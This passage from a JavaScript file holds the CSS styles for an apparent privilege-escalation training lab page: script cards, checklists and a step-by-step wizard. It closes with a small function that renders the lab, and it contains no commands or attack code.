            .script-card { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; margin-bottom: 15px; }
            .script-card h4 { color: #fff; margin: 0 0 10px; }
            .script-card code { display: block; background: #0a0a12; padding: 12px; border-radius: 8px; color: #2ecc71; font-size: 0.85rem; margin-bottom: 15px; }
            .script-actions { display: flex; gap: 10px; }
            .script-actions button, .script-actions a { padding: 8px 15px; background: #ffd700; border: none; border-radius: 5px; color: #000; cursor: pointer; text-decoration: none; font-size: 0.85rem; }
            .script-actions a { background: rgba(255,255,255,0.1); color: #ffd700; }

            .checklist-section { padding: 20px 0; }
            .checklist-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 30px; }
            .checklist-col { background: rgba(0,0,0,0.3); padding: 25px; border-radius: 15px; }
            .checklist-col h3 { color: #ffd700; margin: 0 0 20px; }
            .checklist-items { display: flex; flex-direction: column; gap: 12px; }
            .checklist-items label { display: flex; align-items: center; gap: 12px; color: #aaa; cursor: pointer; padding: 10px; background: rgba(255,255,255,0.03); border-radius: 8px; transition: 0.2s; }
            .checklist-items label:hover { background: rgba(255,255,255,0.08); }
            .checklist-items input[type="checkbox"] { width: 18px; height: 18px; accent-color: #2ecc71; }
            .checklist-items input:checked + * { color: #2ecc71; text-decoration: line-through; }

            @media (max-width: 900px) { .scripts-grid, .checklist-grid, .commands-list { grid-template-columns: 1fr; } }

            /* PATHFINDER WIZARD STYLES */
            .pathfinder-container { max-width: 800px; margin: 0 auto; background: rgba(0,0,0,0.2); padding: 40px; border-radius: 16px; text-align: center; }
            .pf-header { margin-bottom: 30px; position: relative; }
            .pf-header h2 { color: #ffd700; margin: 0 0 10px; font-size: 2rem; }
            .pf-header p { color: #aaa; font-size: 1.1rem; }
            .pf-back { position: absolute; left: 0; top: 0; background: transparent; border: 1px solid #333; color: #888; padding: 5px 15px; border-radius: 20px; cursor: pointer; transition: 0.2s; }
            .pf-back:hover { border-color: #ffd700; color: #ffd700; }
            
            .pf-question h3 { font-size: 1.5rem; margin-bottom: 30px; color: #fff; }
            .pf-options { display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; }
            
            .pf-btn { padding: 30px; min-width: 200px; background: rgba(255,255,255,0.05); border: 2px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; cursor: pointer; transition: 0.2s; display: flex; flex-direction: column; align-items: center; gap: 15px; }
            .pf-btn i { font-size: 2.5rem; color: #666; transition: 0.2s; }
            .pf-btn:hover { background: rgba(255,215,0,0.1); border-color: #ffd700; transform: translateY(-5px); }
            .pf-btn:hover i { color: #ffd700; }
            .pf-btn small { color: #888; margin-top: 5px; font-size: 0.8rem; }
            
            .pf-result-title .v2-tag { background: #2ecc71; color: #000; padding: 2px 8px; border-radius: 4px; font-size: 0.8rem; font-weight: bold; vertical-align: middle; }
            .pf-results { text-align: left; display: grid; gap: 15px; margin-top: 30px; }
            
            .pf-step-card { background: rgba(0,0,0,0.4); padding: 20px; border-radius: 10px; border-left: 4px solid #ffd700; }
            .step-head { display: flex; flex-direction: column; margin-bottom: 10px; }
            .step-head strong { color: #ffd700; font-size: 1.1rem; }
            .step-head span { color: #aaa; font-size: 0.9rem; }
            .step-cmd { display: flex; gap: 10px; background: #0a0a12; padding: 12px; border-radius: 8px; align-items: center; }
            .step-cmd code { flex: 1; color: #2ecc71; font-family: 'JetBrains Mono', monospace; word-break: break-all; }
            .step-cmd button { background: none; border: none; color: #666; cursor: pointer; }
            .step-cmd button:hover { color: #fff; }
            
            .pf-footer { margin-top: 40px; padding-top: 20px; border-top: 1px solid #333; color: #666; }
            
            .fade-in-up { animation: fadeInUp 0.5s ease-out; }
            @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        </style>`;
    }
};

function pagePrivEscLab() {
    return PrivEscLab.render();
}
